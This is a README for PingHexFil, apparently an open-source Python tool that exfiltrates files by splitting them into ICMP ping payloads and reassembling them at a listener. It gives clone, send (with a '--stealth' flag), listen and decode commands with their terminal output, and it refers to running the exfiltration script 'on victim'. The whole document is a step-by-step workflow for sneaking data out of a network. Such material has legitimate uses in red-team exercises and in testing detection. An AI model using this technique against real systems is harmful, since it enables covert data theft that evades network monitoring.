# PingHexFil
Exfiltration of small files using ICMP
## Data Exfiltration using ICMP
Pass a file name, destination IP address, and "--stealth" (optional), to the application. The application will chunk the file into 60K sizes and send each "chunk" as the data payload of the ICMP request to the destination IP address. Ensure that you are capturing ICMP packets at the destination before sending. You can do this using Wireshark.
## Usage
The following is done with the example file, `examples/example1.txt`
## Installation
Ensure that you have Python-Scapy installe don your system. This application is written in Python and is OS independent.
```
root@demon:/tmp# git clone https://github.com/weaknetlabs/pinghexfil
Cloning into 'pinghexfil'...
remote: Enumerating objects: 83, done.
remote: Counting objects: 100% (83/83), done.
remote: Compressing objects: 100% (66/66), done.
remote: Total 83 (delta 38), reused 29 (delta 9), pack-reused 0
Unpacking objects: 100% (83/83), done.
root@demon:/tmp# cd pinghexfil/
```
### Step 1: Send the Bytes via ICMP
Start `PingHexFil` 
```
root@demon:/tmp/pinghexfil# ./pinghexfil.py 127.0.0.1 examples/example1.txt --stealth
[+] Opening file: examples/example1.txt
[+] The file examples/example1.txt is 168517 bytes.
[+] This will require: 5 packets to transmit.
[+] Start the listener with count of 5, hit ENTER when ready ... 
```
### Step 2: Start the Listener
```
root@demon:/tmp/pinghexfil# ./recvdata.py outputfile.txt 127.0.0.1 5
[+] Waiting for data from: 127.0.0.1
[+] Writing to file: outputfile.txt
[+] Packet count: 5
[+] Begin exfiltration script on victim now ...
```
### Step 3: Start the File Transfer
Hit ENTER in the PingHexFil.py window to begin the file transfer via ICMP:
```
[+] 60000 bytes sent via ICMP.
[+] 60000 bytes sent via ICMP.
[+] 60000 bytes sent via ICMP.
[+] 60000 bytes sent via ICMP.
[+] 60000 bytes sent via ICMP.
[+] File exfiltration complete.
[+] 5 ICMP packets sent.
root@demon:/tmp/pinghexfil# 
```
### Step 4: Decode the File
Ensure that you have the file, by checking the handler screen, you should now see this:
```
[+] Transfer complete. File outputfile.txt written.
root@demon:/tmp/pinghexfil# 
```
Next we need to decode the output file, `outputfile.txt` with the `file-decoder.py` application. 
```
root@demon:/tmp/pinghexfil# ./file-decoder.py outputfile.txt 
[+] Opening file: outputfile.txt
This is a test file.
This is a test file.
... SNIPPED ...
This is a test file.
This is a test file.
```
The process is now completed.
